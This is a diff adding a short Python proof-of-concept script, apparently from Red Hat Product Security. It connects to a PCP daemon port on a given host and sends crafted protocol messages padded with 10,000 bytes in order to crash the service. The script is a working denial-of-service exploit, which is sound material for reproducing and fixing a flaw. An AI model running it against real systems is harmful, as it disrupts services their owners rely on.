@@ -1,0 +1,15 @@
+#
+# usage: python crash-pmns-names HOST
+#
+# Florian Weimer / Red Hat Product Security Team
+#
+import socket
+import sys
+_, host = sys.argv
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 44321))
+message = b"\x00\x00\x00\x14\x00\x00p\x0c\x00\x00\x00\x01\x00\x00\x00\x01\x01\x02\x00\x00"
+message += b"\x00\x00',\x00\x00p\x0e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00'\x10"
+message += b"X" * 10000
+sock.send(message)
+sock.close()
